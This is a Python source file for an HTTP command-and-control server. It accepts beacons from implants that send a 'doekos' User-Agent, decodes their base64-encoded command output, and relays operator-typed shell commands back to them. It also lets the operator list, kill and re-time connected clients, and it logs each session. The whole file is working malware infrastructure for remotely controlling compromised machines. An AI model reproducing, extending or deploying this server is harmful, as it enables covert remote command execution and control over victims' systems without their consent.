import base64
import datetime
import sys
import time
import urllib.parse
from http.HttpServer import HttpServer
from http.HttpServerCallback import HttpServerCallback
import argparse

sendqueue = None
debug = False
clients = set()
clientsToKill = set()
connection_details = {}
clientsToChangeLatency = {}
lastMessageIsNone = False
port = 80


# def print_prompt():
#   sys.stdout.write('\r$> ')

def print_(content, end=None):
    if end is not None:
        print(content, end=end)
        with open('log_0.0.0.0:{}.log'.format(port), 'a+') as log_file:
            log_file.write('{}{}'.format(content, end))
    else:
        print(content)
        with open('log_0.0.0.0:{}.log'.format(port), 'a+') as log_file:
            log_file.write('{}\n'.format(content))


def httpServerRequest(request):

    global sendqueue
    global clients
    global lastMessageIsNone

    if debug:
        print_(request.headers)

    if b'User-Agent' not in request.headers:
        return b'whoami'

    if request.headers[b'User-Agent'] != b'doekos':
        return b'whoami'

    if debug:
        print_(request.body)

    try:

        clientId = request.headers[b'Client-Agent'].decode('utf-8')

        if clientId not in clients:
            print_('[+] Client {} connected'.format(clientId))
            clients.add(clientId)
            connection_details[clientId] = time.time()
        else:
            connection_details[clientId] = time.time()

        if clientId in clientsToKill:
            print_('[+] Sending signal to kill {}'.format(clientToKill))
            clientsToKill.remove(clientId)
            del connection_details[clientId]
            return b'c2kill ' + clientId.encode()

        if clientId in clientsToChangeLatency:
            latency = clientsToChangeLatency[clientId]
            print_('[+] Changing latency from client \'{}\' to {}'.format(clientId, latency))
            del clientsToChangeLatency[clientId]
            return b'c2lat ' + latency.encode()

        parsedRequest = base64.b64decode(urllib.parse.unquote(request.body.decode('utf-8').split('a=')[1])).decode('utf-8', ).replace('\x00', '')

        a = b's'
        b = a.decode()

        if parsedRequest == '[-] Command failed to execute':
            print_(parsedRequest)
        elif parsedRequest != 'None':
            lastMessageIsNone = False
            print_(parsedRequest, end='')
        if sendqueue is None:
            # if not lastMessageIsNone:
            # print_prompt()
            lastMessageIsNone = True
            # sys.stdout.flush()
            return b'None'
        else:
            response = sendqueue
            sendqueue = None
            return response
    except ImportError:
        return b'None'


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("port", default=80)
    args = parser.parse_args()

    port = args.port

    HttpServer(
        HttpServerCallback(httpServerRequest),
        host='0.0.0.0',
        port=int(port)
    ).start()

    while True:
        inp = input()
        with open('log_0.0.0.0:{}.log'.format(port), 'a+') as log_file:
            log_file.write('{}\n'.format(inp))
        if inp == 'c2 clients':
            for client in clients:
                if time.time() - connection_details[client] < 10:
                    print_('Client \'{}\'\tConnected'.format(client))
                else:
                    print_('Client \'{}\'\tLost connection'.format(client))
            # print_prompt()
        elif inp.startswith('c2 kill '):
            clientToKill = inp.split('c2 kill ')[1]
            clientsToKill.add(clientToKill)
            clients.remove(clientToKill)
            # print_prompt()
        elif inp.startswith('c2 latency '):
            client_latency = inp.split('c2 latency ')[1]
            client_latency_split = client_latency.split(' ')
            clientId = client_latency_split[0]
            latency = client_latency_split[1]
            clientsToChangeLatency[clientId] = latency
            # print_prompt()
        else:
            sendqueue = inp.encode()
